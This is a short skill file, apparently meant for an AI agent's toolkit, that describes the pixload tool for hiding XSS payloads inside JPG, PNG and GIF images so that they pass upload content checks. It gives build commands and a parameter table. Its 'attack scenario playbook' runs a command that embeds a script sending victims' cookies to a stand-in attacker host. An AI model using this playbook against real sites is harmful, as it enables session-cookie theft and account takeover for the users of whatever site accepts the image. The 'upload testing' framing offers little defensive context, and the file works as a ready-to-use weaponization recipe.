---
name: pixload-image-payload
description: "Image upload XSS and content-check bypass. Signals: payload development, weaponization, PNG injection, GIF injection."
zh-signals: "Pixload: 图片上传 XSS/内容检查绕过。信号:载荷开发,武器化,PNG 注入,GIF 注入。"
when-to-use: >-
  Use when you need to build image files that carry XSS payloads for upload testing,
  bypassing content-type or image validation while keeping the file renderable.
---

# Pixload

- Attack Category: C07 Payload Development and Weaponization
- Upstream Repository: https://github.com/chinarulezzz/pixload
- Upstream License: WTFPL (this SKILL.md is re-released under Apache-2.0; upstream copyright belongs to the original project)

## Installation

```bash
git clone https://github.com/chinarulezzz/pixload && cd pixload && make
```

## Parameter Quick Reference

| Parameter / Command | Description |
| --- | --- |
| `./pixload-jpg payload.jpg` | Inject payload into JPG |
| `./pixload-png out.png` | PNG injection |
| `./pixload-gif out.gif` | GIF injection |
| `-x 'alert(1)'` | Custom JS payload |

## Attack Scenario Playbook

### Image upload XSS / content-check bypass

```bash
./pixload-jpg photo.jpg -x '<script>fetch("//attacker/?c="+document.cookie)</script>'
# After uploading to the target, XSS triggers when the image is rendered directly
```

## Notes

Injects a payload into the image binary without breaking its displayability; used to bypass upload content checks and passive XSS.
